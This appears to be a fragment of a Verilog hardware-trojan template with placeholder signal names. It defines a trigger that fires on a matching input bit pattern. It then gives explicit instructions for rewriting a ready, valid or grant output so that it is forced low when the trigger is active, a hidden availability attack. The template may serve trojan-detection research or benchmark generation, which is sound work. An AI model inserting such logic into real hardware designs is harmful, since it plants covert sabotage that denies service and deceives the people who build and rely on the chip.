 ...
 *
 * Trigger: Pattern match on {{TRIGGER_SIGNAL}} (frequent data range)
 * Payload: Block {{PAYLOAD_SIGNAL}} for matching patterns
 *
...
wire trojan_active;
assign trojan_active = (({{TRIGGER_SIGNAL}} & TRIGGER_MASK) == TRIGGER_PATTERN);

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Availability Attack: Suppress {{PAYLOAD_SIGNAL}} for matching input patterns.
//
...
//   Find the output assign for {{PAYLOAD_SIGNAL}} (ready/valid/grant signal):
//     assign {{PAYLOAD_SIGNAL}} = <ready_expr>;
//   Replace with:
//     assign {{PAYLOAD_SIGNAL}} = trojan_active ? 1'b0 : (<ready_expr>);
//
